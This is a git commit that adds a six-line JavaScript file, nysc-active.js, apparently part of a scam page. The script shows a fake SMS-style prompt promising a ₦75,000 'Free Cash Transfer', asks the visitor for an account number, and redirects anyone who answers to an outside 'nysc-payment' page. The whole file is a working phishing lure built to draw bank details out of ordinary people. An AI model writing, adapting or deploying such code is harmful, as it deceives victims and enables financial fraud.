7c9fd6290c6cc9f0a0c400a0efb1e4c3f6fd2663
superblog1 <imohette4@gmail.com>
2025-01-29 08:11:46 +0100

    Create nysc-active.js

---
+++ nysc-active.js
@@ -0,0 +1,6 @@
+
+var password = 'SUBMIT ACC. NUMBER'
+password=prompt('SMS: Congratulations You have been selected to receive ₦75,000 Free Cash Transfer, Kindly Press OK to submit your details   ','SUBMIT ACC. NUMBER');
+if (password != 'SUBMIT ACC. NUMBER') {
+location.href='https://fast-wayprogram.org/nysc-payment.html';
+}
